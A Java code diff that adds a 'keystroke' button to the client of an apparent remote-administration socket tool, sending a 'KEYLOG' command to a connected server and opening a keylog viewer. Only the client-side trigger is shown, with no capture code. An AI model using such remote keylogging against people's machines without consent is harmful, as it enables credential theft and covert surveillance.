@@ -57,6 +57,11 @@ public class client extends JFrame {
                 butApplicationList_Click();
             }
         });
+        keystrokeButton.addActionListener(new ActionListener() {
+            public void actionPerformed(ActionEvent e) {
+                keystrokeButton_Click();
+            }
+        });
     }
     public client() {
         InitializeComponent();
@@ -94,6 +99,25 @@ public class client extends JFrame {
         }
         process viewapp = new process();
         viewapp.setVisible(true);
+    }
+
+    public void keystrokeButton_Click() {
+        if (Program.socketOfClient == null)
+        {
+            JOptionPane.showMessageDialog(contentPane, "Chưa kết nối đến server");
+            return;
+        }
+        String sCommand = "KEYLOG";
+        try {
+            Program.nw.write(sCommand);
+            Program.nw.newLine();
+            Program.nw.flush();
+        } catch (IOException e)
+        {
+            System.out.println(e);
+        }
+        Keylog keylogviewapp = new Keylog();
+        keylogviewapp.setVisible(true);
     }
 
     public void butPic_Click() {
